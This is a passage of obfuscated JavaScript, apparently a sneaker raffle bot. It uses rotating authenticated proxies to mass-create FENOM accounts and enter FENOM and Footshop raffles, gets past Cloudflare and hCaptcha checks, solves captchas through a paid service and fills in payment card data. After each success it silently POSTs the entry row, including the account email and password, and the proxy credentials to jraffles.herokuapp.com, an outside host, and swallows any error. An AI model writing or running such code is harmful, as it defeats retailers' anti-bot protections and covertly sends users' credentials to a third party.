                                    if (_0xa30eb4['Email'] == _0x14bc24['Email']) {
                                        _0xb1b50a = !![];
                                        break;
                                    }
                                }
                                return _0xb1b50a;
                            }
                            try {
                                if (await _0x1b684f(_0x565558[_0x125a84]) == !![]) {
                                    console['log'](_0x46dcc5() + '\x20[' + _0x36a6f9['name'] + ']\x20Task\x20' + (_0x125a84 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x2228dc = !![], dupli = !![];
                                    return;
                                }
                                try {
                                    _0x26f682 = await _0x510708['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x610fe6[0x0] + ':' + _0x610fe6[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x26f682 = await _0x510708['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x610fe6[0x0] + ':' + _0x610fe6[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x54102f = await _0x26f682['newPage']();
                                await _0x54102f['setViewport']({
                                    'width': 0x500 + _0x8891f8(0x1, 0x32),
                                    'height': 0x2d9 + _0x8891f8(0x1, 0x32)
                                });
                                const _0xeffff0 = await _0x54102f['target']()['createCDPSession'](), { windowId: _0x3affaa } = await _0xeffff0['send']('Browser.getWindowForTarget');
                                await _0x54102f['authenticate']({
                                    'username': '' + _0x610fe6[0x2],
                                    'password': '' + _0x610fe6[0x3]
                                }), console['log'](_0x46dcc5() + '\x20[' + _0x36a6f9['name'] + ']\x20Task\x20' + (_0x125a84 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x54102f['goto']('' + _0x16ffc8, { 'waitUntil': 'networkidle2' }), console['log'](_0x46dcc5() + '\x20[' + _0x36a6f9['name'] + ']\x20Task\x20' + (_0x125a84 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x4fda60(0x1388);
                                var _0x218df3 = await _0x54102f['$']('.hcaptcha-box');
                                if (_0x218df3) {
                                    console['log'](_0x46dcc5() + '\x20[' + _0x36a6f9['name'] + ']\x20Task\x20' + (_0x125a84 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x4fda60(0x2710);
                                    const _0x434859 = await _0x54102f['$']('.hcaptcha-box');
                                    if (_0x434859)
                                        try {
                                            await _0x434859['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x54102f['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0xab93f7 = await _0x54102f['$']('.hcaptcha-box');
                                        if (_0xab93f7)
                                            try {
                                                await _0xab93f7['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x54102f['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0xeffff0['send']('Browser.setWindowBounds', {
                                        'windowId': _0x3affaa,
                                        'bounds': { 'windowState': 'minimized' }
                                    }), await _0x4fda60(0xfa0);
                                } catch {
                                    throw new Error('Blocked\x20by\x20cloudflare');
                                }
                                console['log'](_0x46dcc5() + '\x20[' + _0x36a6f9['name'] + ']\x20Task\x20' + (_0x125a84 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x54102f['type']('input[name=\x22firstname\x22]', '' + _0x565558[_0x125a84]['FirstName']), await _0x4fda60(0x1f4), await _0x54102f['type']('input[name=\x22lastname\x22]', '' + _0x565558[_0x125a84]['LastName']), await _0x4fda60(0x1f4), await _0x54102f['type']('input[name=\x22email\x22]', '' + _0x565558[_0x125a84]['Email']), await _0x4fda60(0x1f4), await _0x54102f['type']('input[name=\x22password\x22]', '' + _0x565558[_0x125a84]['Password']), await _0x4fda60(0x258), await _0x54102f['$eval']('input[name=\x22psgdpr\x22]', _0x1df083 => _0x1df083['click']()), await _0x4fda60(0x1f4), console['log'](_0x46dcc5() + '\x20[' + _0x36a6f9['name'] + ']\x20Task\x20' + (_0x125a84 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x54102f['$eval']('#customer-form', _0x2ff021 => _0x2ff021['submit']());
                                try {
                                    try {
                                        await _0x54102f['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                    } catch {
                                        throw new Error('Succes-response\x20not\x20found');
                                    }
                                    _0x443b3f = 'no', console['log'](_0x3e3bb6['green'](_0x46dcc5() + '\x20[' + _0x36a6f9['name'] + ']\x20Task\x20' + (_0x125a84 + 0x1) + '\x20:\x20Account\x20' + _0x565558[_0x125a84]['Email'] + '\x20Generated')), _0x147d24['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x565558[_0x125a84]['Email'] + ',' + _0x565558[_0x125a84]['Password']);
                                    let _0x53b18e = _0x565558[_0x125a84];
                                    try {
                                        prxdata = {
                                            'username': _0x26c985['replace']('#', ''),
                                            'module': _0x36a6f9['name'],
                                            'entrydata': JSON['stringify'](_0x53b18e),
                                            'proxy': '' + _0x15ef56[_0x125a84]
                                        };
                                        var _0x37545c = JSON['stringify'](prxdata);
                                        let _0x2f746c = { 'headers': { 'content-type': 'application/json' } };
                                        await _0x3c935b['post']('https://jraffles.herokuapp.com/success', _0x37545c, _0x2f746c);
                                    } catch (_0x13c95d) {
                                    }
                                    try {
                                        _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0xcf7352['succesDEVMSG']);
                                    } catch {
                                    }
                                    await _0xb6cfae(_0xc2690c, _0xcf7352['succesDEVMSG']);
                                } catch (_0x394b4d) {
                                    throw new Error('Account\x20generation\x20failed');
                                }
                            } catch (_0x25733f) {
                                console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x36a6f9['name'] + ']\x20Task\x20' + (_0x125a84 + 0x1) + '\x20:\x20' + _0x25733f)), _0x4c0605 = '' + _0x25733f;
                                var _0x5eab98 = await _0x1523c9(_0x565558[_0x125a84], _0x36a6f9, 'acc', !![], _0x4c0605);
                                _0xcf7352['errorDEV'] = { 'embeds': [_0x5eab98] }, _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0xcf7352['errorDEV']), await _0xb6cfae(_0x991bd5, _0xcf7352['errorDEV']), _0x443b3f = 'yes';
                            } finally {
                                _0x26f682 && _0x26f682['close']();
                                if (_0x443b3f == 'yes' && _0x5322dc != 0x5)
                                    return console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x36a6f9['name'] + ']\x20Task\x20' + (_0x125a84 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5322dc + '\x20/\x205)')), _0x5322dc = _0x5322dc + 0x1, _0x3fbce3--, _0x499b04(_0x36a6f9, _0x565558, _0x15ef56, _0x125a84, _0x5322dc);
                                _0x443b3f == 'yes' && _0x5322dc >= 0x5 && _0x2540d5(_0x565558[_0x125a84], _0x36a6f9), !_0x2228dc && (console['log'](_0x46dcc5() + '\x20[' + _0x36a6f9['name'] + ']\x20Waiting\x20for\x20' + _0x255a87['delay'] + '\x20ms'), await _0x4fda60(_0x255a87['delay'])), _0x3fbce3--;
                            }
                        }
                        _0x499b04(_0x58bf34, _0x1c101c, _0x5de4db, _0x10acc6), !_0x2228dc && await _0x4fda60(0x15e);
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x4140d(_0xfd2681, _0x143998, _0x7224ca) {
                    _0x510708['use'](_0x4fd89e()), _0x510708['use'](_0x3b4fcd({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x255a87['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x225214 = 0x0; _0x225214 < _0x143998['length']; _0x225214++) {
                        if (_0x206ea9 != 'yes')
                            var _0x206ea9 = '', _0x137ef6 = 0x0;
                        var _0x1963ea;
                        try {
                            await _0x436f00(_0x143998, _0x225214);
                        } catch {
                            _0x206ea9 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0xf5e41e(_0xfd2681['name'] + '\x20Task\x20' + (_0x225214 + 0x1) + '\x20/\x20' + _0x143998['length'] + '\x20||\x20File:\x20' + _0x20d7ea + '\x20Proxies:\x20' + _0xf0d869);
                        const _0x1becf1 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x5f3ad1 = Math['round'](Math['random']() * (_0x7224ca['length'] - 0x1)), _0x178cb3 = _0x7224ca[_0x5f3ad1]['split'](':'), _0x3036eb;
                        try {
                            _0x3036eb = await _0x510708['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x178cb3[0x0] + ':' + _0x178cb3[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3036eb = await _0x510708['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x178cb3[0x0] + ':' + _0x178cb3[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x16cebe = await _0x3036eb['newPage'](), _0x544578 = await _0x16cebe['target']()['createCDPSession'](), { windowId: _0x4008ae } = await _0x544578['send']('Browser.getWindowForTarget');
                            await _0x16cebe['authenticate']({
                                'username': '' + _0x178cb3[0x2],
                                'password': '' + _0x178cb3[0x3]
                            }), console['log'](_0x46dcc5() + '\x20[' + _0xfd2681['name'] + ']\x20Task\x20' + (_0x225214 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x16cebe['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x46dcc5() + '\x20[' + _0xfd2681['name'] + ']\x20Task\x20' + (_0x225214 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x4fda60(0x1388);
                            var _0x3246c3 = await _0x16cebe['$']('.hcaptcha-box');
                            if (_0x3246c3) {
                                console['log'](_0x46dcc5() + '\x20[' + _0xfd2681['name'] + ']\x20Task\x20' + (_0x225214 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x4fda60(0x2710);
                                const _0x5785a5 = await _0x16cebe['$']('.hcaptcha-box');
                                if (_0x5785a5)
                                    try {
                                        await _0x5785a5['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x16cebe['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x594212 = await _0x16cebe['$']('.hcaptcha-box');
                                    if (_0x594212)
                                        try {
                                            await _0x594212['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            await _0x544578['send']('Browser.setWindowBounds', {
                                'windowId': _0x4008ae,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x4fda60(0x1f40);
                            try {
                                await _0x16cebe['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x4fda60(0x1388), console['log'](_0x46dcc5() + '\x20[' + _0xfd2681['name'] + ']\x20Task\x20' + (_0x225214 + 0x1) + '\x20:\x20Logging\x20in'), await _0x16cebe['type']('input[name=\x22email\x22]', '' + _0x143998[_0x225214]['Email']), await _0x4fda60(0x1f4), await _0x16cebe['type']('input[name=\x22password\x22]', '' + _0x143998[_0x225214]['Password']), await _0x4fda60(0x258), await _0x16cebe['$eval']('#login-form', _0x230878 => _0x230878['submit']()), await _0x16cebe['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x4fda60(0x1f4), await _0x16cebe['goto']('' + _0x143998[_0x225214]['Url']), await _0x16cebe['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x46dcc5() + '\x20[' + _0xfd2681['name'] + ']\x20Task\x20' + (_0x225214 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x143998[_0x225214]['Size']);
                            if (_0x143998[_0x225214]['Size'] != 'RANDOM') {
                                var _0x13a446 = '\x20' + _0x143998[_0x225214]['Size'] + '\x20';
                                const _0x1b89e8 = await _0x16cebe['$x']('//span[contains(text(),\x20' + _0x13a446 + ')]');
                                await _0x1b89e8[0x0]['click']();
                            } else {
                                const _0x19b7cb = await _0x16cebe['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x42b9d1 = Math['round'](Math['random']() * (_0x19b7cb['length'] - 0x1));
                                await _0x19b7cb[_0x42b9d1]['click']();
                            }
                            await _0x4fda60(0x258), await _0x16cebe['click']('#cookieChoiceDismiss'), await _0x4fda60(0x3e8), await _0x16cebe['type']('#instagram-account', '' + _0x143998[_0x225214]['Follower']), await _0x4fda60(0x28a), await _0x16cebe['click']('#book-btn'), await _0x4fda60(0xbb8);
                            try {
                                await _0x16cebe['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x4fda60(0x1f4), console['log'](_0x46dcc5() + '\x20[' + _0xfd2681['name'] + ']\x20Task\x20' + (_0x225214 + 0x1) + '\x20:\x20' + _0x3e3bb6['cyan']('Solving\x20Captcha')), await _0x16cebe['solveRecaptchas'](), console['log'](_0x46dcc5() + '\x20[' + _0xfd2681['name'] + ']\x20Task\x20' + (_0x225214 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x4fda60(0x7d0), await _0x16cebe['$eval']('#book-btn-for-sure', _0x948f7b => _0x948f7b['click']()), await _0x4fda60(0x12c), await _0x16cebe['click']('#book-btn-for-sure'), await _0x4fda60(0xdac);
                            const _0x217baa = await _0x16cebe['$eval']('.reservation-popup\x20>\x20.title', _0x5a6971 => {
                                return _0x5a6971['innerHTML'];
                            });
                            if (_0x217baa) {
                                _0x206ea9 = 'no', _0x8bf342(_0x143998[_0x225214], _0xfd2681), console['log'](_0x3e3bb6['green'](_0x46dcc5() + '\x20[' + _0xfd2681['name'] + ']\x20Task\x20' + (_0x225214 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x797a31 = await _0x1523c9(_0x143998[_0x225214], _0xfd2681, 'dev', ![]), _0x5a45f5 = await _0x1523c9(_0x143998[_0x225214], _0xfd2681, 'pub', ![]);
                                let _0x48e86d = _0x143998[_0x225214];
                                try {
                                    prxdata = {
                                        'username': _0x26c985['replace']('#', ''),
                                        'module': _0xfd2681['name'],
                                        'entrydata': JSON['stringify'](_0x48e86d),
                                        'proxy': '' + _0x7224ca[_0x225214]
                                    };
                                    var _0x44b4bb = JSON['stringify'](prxdata);
                                    let _0xbb696d = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3c935b['post']('https://jraffles.herokuapp.com/success', _0x44b4bb, _0xbb696d);
                                } catch (_0x2b7ee0) {
                                }
                                const _0x306b81 = {
                                    'succesDEVMSG': { 'embeds': [_0x797a31] },
                                    'succesPUBMSG': { 'embeds': [_0x5a45f5] }
                                };
                                try {
                                    _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0x306b81['succesDEVMSG']), await _0x4fda60(0xc8), await _0xb6cfae(_0x4fb406, _0x306b81['succesDEVMSG']), await _0x4fda60(0xc8), await _0xb6cfae(_0x5d80c9, _0x306b81['succesPUBMSG']);
                                } catch (_0xdc2571) {
                                    console['log'](_0x3e3bb6['yellow'](_0x46dcc5() + '\x20[' + _0xfd2681['name'] + ']\x20Task\x20' + (_0x225214 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xdc2571));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x588508) {
                            console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0xfd2681['name'] + ']\x20Task\x20' + (_0x225214 + 0x1) + '\x20:\x20' + _0x588508)), _0x1963ea = '' + _0x588508;
                            var _0x42f30d = await _0x1523c9(_0x143998[_0x225214], _0xfd2681, 'dev', !![], _0x1963ea), _0x797a31 = await _0x1523c9(_0x143998[_0x225214], _0xfd2681, 'dev', ![]), _0x5a45f5 = await _0x1523c9(_0x143998[_0x225214], _0xfd2681, 'pub', ![]);
                            const _0x3ef6dc = {
                                'succesDEVMSG': { 'embeds': [_0x797a31] },
                                'succesPUBMSG': { 'embeds': [_0x5a45f5] }
                            };
                            _0x3ef6dc['errorDEV'] = { 'embeds': [_0x42f30d] }, _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0x3ef6dc['errorDEV']), await _0xb6cfae(_0x991bd5, _0x3ef6dc['errorDEV']), _0x588508 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x206ea9 = 'yes');
                        } finally {
                            _0x3036eb['close']();
                            if (_0x206ea9 == 'yes' && _0x137ef6 != 0x5 && _0x1963ea != 'Size\x20Not\x20Found') {
                                console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0xfd2681['name'] + ']\x20Task\x20' + (_0x225214 + 0x1) + '\x20:\x20Retrying\x20(' + _0x137ef6 + '\x20/\x205)')), _0x225214 = _0x225214 - 0x1, _0x137ef6 = _0x137ef6 + 0x1;
                                continue;
                            }
                            _0x206ea9 == 'yes' && _0x137ef6 >= 0x5 && (_0x2540d5(_0x143998[_0x225214], _0xfd2681), _0x206ea9 = 'no', _0x137ef6 = 0x0), console['log'](_0x46dcc5() + '\x20[' + _0xfd2681['name'] + ']\x20Waiting\x20for\x20' + _0x255a87['delay'] + '\x20ms'), await _0x4fda60(_0x255a87['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x4a5190, _0xdebabb, _0xd8c2cf) {
                _0x510708['use'](_0x4fd89e()), _0x510708['use'](_0x3b4fcd({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x255a87['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x578cc5 = 0x0; _0x578cc5 < _0xdebabb['length']; _0x578cc5++) {
                    var _0x2bfac9;
                    if (_0x322016 != 'yes')
                        var _0x322016 = '', _0x2258b0 = 0x0;
                    var _0x3806a3 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x26c985
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0xdebabb[_0x578cc5]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0xdebabb[_0x578cc5]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x255a87['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x1ad228
                            }
                        ]
                    }], _0x40cc03 = await _0x1523c9(_0xdebabb[_0x578cc5], _0x4a5190, 'dev', ![]), _0x297553 = await _0x1523c9(_0xdebabb[_0x578cc5], _0x4a5190, 'pub', ![]);
                    const _0x1e49dc = {
                        'succesDEVMSG': { 'embeds': [_0x40cc03] },
                        'succesPUBMSG': { 'embeds': [_0x297553] }
                    }, _0x25c989 = { 'embeds': _0x3806a3 };
                    try {
                        await _0x436f00(_0xdebabb, _0x578cc5);
                    } catch {
                        _0x322016 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0xdebabb[_0x578cc5]['Email'] == '' || _0xdebabb[_0x578cc5]['FirstName'] == '' || _0xdebabb[_0x578cc5]['LastName'] == '' || _0xdebabb[_0x578cc5]['Country'] == '' || _0xdebabb[_0x578cc5]['Size'] == '' || _0xdebabb[_0x578cc5]['Address1'] == '' || _0xdebabb[_0x578cc5]['Zip'] == '') {
                        console['log'](_0x46dcc5() + '\x20[' + _0x4a5190['name'] + ']\x20Task\x20' + (_0x578cc5 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0xdebabb[_0x578cc5]['Email'] == '' || _0xdebabb[_0x578cc5]['FirstName'] == '' || _0xdebabb[_0x578cc5]['LastName'] == '' || _0xdebabb[_0x578cc5]['Country'] == '' || _0xdebabb[_0x578cc5]['Size'] == '' || _0xdebabb[_0x578cc5]['Address1'] == '' || _0xdebabb[_0x578cc5]['Zip'] == '' || _0xdebabb[_0x578cc5]['Phone'] == '') {
                        console['log'](_0x46dcc5() + '\x20[' + _0x4a5190['name'] + ']\x20Task\x20' + (_0x578cc5 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x53bc99 = '' + _0xdebabb[_0x578cc5]['Url'];
                    if (_0x255a87['useRandomProxy'] = ![])
                        var _0x581892 = _0xd8c2cf[_0x578cc5]['split'](':');
                    else
                        var _0x24caf9 = Math['round'](Math['random']() * (_0xd8c2cf['length'] - 0x1)), _0x581892 = _0xd8c2cf[_0x24caf9]['split'](':');
                    var _0x5195f3;
                    try {
                        _0x5195f3 = await _0x510708['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x581892[0x0] + ':' + _0x581892[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x5195f3 = await _0x510708['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x581892[0x0] + ':' + _0x581892[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x44c9eb = await _0x5195f3['newPage']();
                        await _0x44c9eb['authenticate']({
                            'username': '' + _0x581892[0x2],
                            'password': '' + _0x581892[0x3]
                        }), console['log'](_0x46dcc5() + '\x20[' + _0x4a5190['name'] + ']\x20Task\x20' + (_0x578cc5 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x44c9eb['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x44c9eb['setRequestInterception'](!![]), _0x44c9eb['on']('request', _0x594ebd => {
                            _0x594ebd['resourceType']() === 'image' || _0x594ebd['resourceType']() === 'font' || _0x594ebd['resourceType']() === 'media' ? _0x594ebd['abort']() : _0x594ebd['continue']();
                        });
                        try {
                            await _0x44c9eb['goto'](_0x53bc99), await _0x4fda60(0xbb8), await _0x44c9eb['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x44c9eb['click']('.control__JhutY'), await _0x4fda60(0x1f4);
                        if (_0xdebabb[_0x578cc5]['Size'] != 'RANDOM')
                            try {
                                const _0x421473 = await _0x44c9eb['$x']('//div[contains(text(),\x20\x27' + _0xdebabb[_0x578cc5]['Size'] + '\x27)]');
                                await _0x421473[0x0]['click']();
                            } catch {
                                console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x4a5190['name'] + ']\x20Task\x20' + (_0x578cc5 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x1c663f = await _0x44c9eb['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x1fc871 = Math['round'](Math['random']() * (_0x1c663f['length'] - 0x1));
                            await _0x1c663f[_0x1fc871]['click']();
                        }
                        await _0x4fda60(0x4b0);
                        const _0x5f34ca = await _0x44c9eb['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x5f34ca[0x0]['click'](), await _0x44c9eb['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x46dcc5() + '\x20[' + _0x4a5190['name'] + ']\x20Task\x20' + (_0x578cc5 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x44c9eb['type']('input[name=\x22email\x22]', '' + _0xdebabb[_0x578cc5]['Email']), await _0x4fda60(0x640), await _0x44c9eb['type']('input[name=\x22phone\x22]', '' + _0xdebabb[_0x578cc5]['Phone']), await _0x4fda60(0x4b0), await _0x44c9eb['click']('button.btn.continue-button__1RtsS'), await _0x4fda60(0x4b0);
                        try {
                            await _0x44c9eb['type']('input[name=\x22firstName\x22]', '' + _0xdebabb[_0x578cc5]['FirstName']), await _0x4fda60(0x258);
                        } catch {
                            const _0x49adbe = await _0x44c9eb['$$eval']('.invalid-feedback\x20>\x20div', _0x2313bc => {
                                return _0x2313bc['map'](_0x3c6e19 => _0x3c6e19['innerText']);
                            });
                            console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x4a5190['name'] + ']\x20Task\x20' + (_0x578cc5 + 0x1) + '\x20:\x20' + _0x49adbe));
                            continue;
                        }
                        await _0x44c9eb['type']('input[name=\x22lastName\x22]', '' + _0xdebabb[_0x578cc5]['LastName']), await _0x4fda60(0xc8), await _0x44c9eb['type']('input[name=\x22instagramUsername\x22]', '' + _0xdebabb[_0x578cc5]['Follower']), await _0x4fda60(0x4b0), await _0x44c9eb['click']('button.btn.continue-button__1RtsS'), await _0x4fda60(0x3e8), console['log'](_0x46dcc5() + '\x20[' + _0x4a5190['name'] + ']\x20Task\x20' + (_0x578cc5 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x44c9eb['select']('select[name=\x22country\x22]', '' + _0xdebabb[_0x578cc5]['Country']), await _0x4fda60(0x2bc), await _0x44c9eb['type']('input[name=\x22streetName\x22]', '' + _0xdebabb[_0x578cc5]['Address1']), await _0x4fda60(0x258), await _0x44c9eb['type']('input[name=\x22houseNumber\x22]', _0xdebabb[_0x578cc5]['HouseNumber'] + '\x20' + _0xdebabb[_0x578cc5]['Address2']), await _0x4fda60(0xc8), await _0x44c9eb['type']('input[name=\x22postalCode\x22]', '' + _0xdebabb[_0x578cc5]['Zip']), await _0x4fda60(0x1f4), await _0x44c9eb['type']('input[name=\x22city\x22]', '' + _0xdebabb[_0x578cc5]['City']), await _0x4fda60(0x4b0), await _0x44c9eb['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x4fda60(0x4b0), await _0x44c9eb['click']('button.btn.continue-button__1RtsS'), await _0x4fda60(0x4b0), console['log'](_0x46dcc5() + '\x20[' + _0x4a5190['name'] + ']\x20Task\x20' + (_0x578cc5 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x44c9eb['solveRecaptchas'](), console['log'](_0x46dcc5() + '\x20[' + _0x4a5190['name'] + ']\x20Task\x20' + (_0x578cc5 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x4fda60(0xbb8), await _0x44c9eb['click']('button.btn.continue-button__1RtsS'), await _0x4fda60(0x1388), console['log'](_0x46dcc5() + '\x20[' + _0x4a5190['name'] + ']\x20Task\x20' + (_0x578cc5 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x44c9eb['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x44c9eb['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4fda60(0x4b0), await _0x44c9eb['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0xdebabb[_0x578cc5]['CardNumber']), await _0x4fda60(0x320), await _0x44c9eb['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x44c9eb['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0xdebabb[_0x578cc5]['ExpiryDate']), await _0x4fda60(0x4b0), await _0x44c9eb['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x44c9eb['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0xdebabb[_0x578cc5]['CVV']), await _0x4fda60(0x226), await _0x44c9eb['type']('input[name=\x22holderName\x22]', '' + _0xdebabb[_0x578cc5]['NameOnCard']), await _0x4fda60(0x226), await _0x44c9eb['click']('button.adyen-checkout__button'), console['log'](_0x46dcc5() + '\x20[' + _0x4a5190['name'] + ']\x20Task\x20' + (_0x578cc5 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x44c9eb['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x4fda60(0xbb8);
                        } catch (_0x128c39) {
                            console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x4a5190['name'] + ']\x20Task\x20' + (_0x578cc5 + 0x1) + '\x20:\x203DS\x20Failed')), _0x2bfac9 = '3DS\x20Error\x20' + _0x128c39;
                            var _0x596a99 = await _0x1523c9(_0xdebabb[_0x578cc5], _0x4a5190, 'dev', !![], _0x2bfac9);
